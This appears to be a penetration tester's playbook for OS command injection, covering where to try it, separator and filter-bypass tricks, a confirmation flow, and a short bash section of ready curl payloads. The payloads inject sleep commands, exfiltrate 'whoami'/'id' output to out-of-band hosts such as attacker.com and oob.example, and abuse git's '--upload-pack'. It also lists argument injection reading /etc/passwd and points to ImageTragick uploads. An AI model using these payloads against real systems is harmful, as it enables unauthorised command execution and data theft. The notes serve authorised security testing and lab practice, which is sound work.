# OS command injection — playbook

## when to try
- Anything that takes a hostname/IP/filename and "does something with it":
  ping, nslookup, whois, image converter (`convert`/ImageMagick), PDF generator
  (wkhtmltopdf), video transcoder (`ffmpeg`), backup, archive (`tar`/`zip`).
- Webhooks that "test" by curling a URL.
- Admin features: "run script", "execute query", "import via shell".

## key tricks
- Separators: `;`, `&`, `&&`, `|`, `||`, `\n` (LF/CR), backticks `` ` ``, `$()`.
- Whitespace bypass: `${IFS}`, `<>`, `{cmd,args}`, tab `%09`.
- Quote bypass: `''`, `""`, backslash splits `c""at`, `c\at`.
- No-output endpoints (blind): use time delay (`sleep 5`), DNS exfil (`nslookup $(whoami).attacker.com`), HTTP exfil (`curl http://oob.example/$(id|base64)`).
- Argument injection (when no shell, but a binary is invoked): `--config=/etc/passwd`, `-o /tmp/x`, `@filename` for some tools.

## confirmation flow
1. Baseline: send normal value, note response body + timing.
2. Probe with `;sleep 5;` (or `& ping -c 5 127.0.0.1`) — response delay = confirmed.
3. OOB: `;curl http://oob/$(whoami)` — DNS+HTTP hit = confirmed.
4. STOP after confirm. Don't read /etc/shadow on real targets.

## exploitation snippet
```bash
# blind time
curl 'https://t/api/ping?host=127.0.0.1%3Bsleep%205%3B' -w '%{time_total}\n'

# OOB exfil
curl "https://t/api/ping?host=127.0.0.1%3Bcurl%20http%3A%2F%2Foob%2F\$(whoami)"

# argument injection — git fetch with --upload-pack
curl 'https://t/api/repo?url=--upload-pack=curl%20http://oob/x;%20github.com/foo/bar'
```

## caveats
- ImageMagick "shell" via crafted images (CVE-2016-3714 PolicyMap) — try uploading a `.mvg`/`.svg` if the pipeline runs `convert`.
- Many "command injection" findings are actually argument injection; report as such.

## provenance
PortSwigger Command Injection labs. ImageTragick (2016). Log4Shell isn't this class but adjacent.
